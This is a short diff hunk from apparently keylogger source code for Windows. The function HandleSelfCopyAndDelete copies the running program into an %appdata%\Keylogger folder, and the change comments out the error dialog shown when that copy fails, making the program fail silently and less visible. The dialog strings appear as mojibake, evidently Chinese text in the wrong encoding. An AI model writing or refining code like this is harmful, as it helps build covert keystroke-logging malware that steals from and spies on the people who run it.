@@ -1020,7 +1020,7 @@ void HandleSelfCopyAndDelete()
     {
         if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
         {
-            MessageBoxW(NULL, L"¸´ÖÆ³ÌÐòµ½ %appdata%\\Keylogger Ê§°Ü", L"´íÎó", MB_ICONERROR);
+            //MessageBoxW(NULL, L"¸´ÖÆ³ÌÐòµ½ %appdata%\\Keylogger Ê§°Ü", L"´íÎó", MB_ICONERROR);
             return;
         }
 
